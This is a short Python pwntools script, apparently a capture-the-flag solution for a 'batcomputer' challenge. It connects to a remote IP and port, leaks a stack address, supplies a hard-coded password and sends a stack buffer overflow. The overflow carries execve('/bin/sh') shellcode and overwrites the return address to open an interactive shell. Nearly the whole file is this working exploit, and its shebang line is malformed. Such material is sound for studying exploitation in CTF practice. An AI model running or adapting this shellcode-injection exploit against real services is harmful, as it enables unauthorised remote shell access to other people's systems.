#!usr/bin/env/python3

from pwn import *


# p = process("./batcomputer")
p = remote("167.99.85.216",32543)

p.sendlineafter("> ",b"1")
output = p.recvline()

shellcode_address = re.findall(r'0x[0-9a-fA-F]+', output.decode('latin-1'))

shellcode_address = int(shellcode_address[0],16)

p.sendlineafter("> ",b"2")
p.sendlineafter(": ",b"b4tp@$$w0rd!")


buf = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"

buf += b"A"*(84-len(buf))
buf += p64(shellcode_address)

p.sendlineafter(": ",buf)

p.sendlineafter("> ",b"50")

p.interactive()

